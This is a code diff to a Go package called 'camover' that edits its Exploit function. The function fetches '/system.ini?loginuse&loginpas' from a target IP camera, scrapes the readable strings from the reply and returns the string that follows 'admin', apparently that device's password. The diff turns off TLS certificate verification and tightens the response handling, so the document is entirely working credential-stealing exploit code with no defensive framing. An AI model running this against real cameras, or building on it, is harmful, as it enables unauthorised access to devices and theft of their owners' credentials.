@@ -1,10 +1,12 @@
 package camover
 
 import (
+	"crypto/tls"
 	"fmt"
 	"io"
 	"net/http"
 	"regexp"
+	"strings"
 	"time"
 )
 
@@ -17,8 +19,13 @@ func NewCamOver() *CamOver {
 func (c *CamOver) Exploit(address string) (string, string, error) {
 	username := "admin"
 
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+
 	client := &http.Client{
-		Timeout: time.Duration(3 * time.Second),
+		Timeout:   time.Duration(3 * time.Second),
+		Transport: transport,
 	}
 
 	url := fmt.Sprintf("http://%s/system.ini?loginuse&loginpas", address)
@@ -43,10 +50,10 @@ func (c *CamOver) Exploit(address string) (string, string, error) {
 
 	bodyString := string(body)
 
-	re := regexp.MustCompile(`[^\x00-\x1F\x7F-\xFF]{4,}`)
-	matches := re.FindAllString(bodyString, -1)
+	if response.StatusCode == http.StatusOK {
+		re := regexp.MustCompile(`[^\x00-\x1F\x7F-\xFF]{4,}`)
+		matches := re.FindAllString(bodyString, -1)
 
-	if response.StatusCode == http.StatusOK && len(matches) > 0 {
 		for index, match := range matches {
 			if match == username {
 				if index+1 < len(matches) {
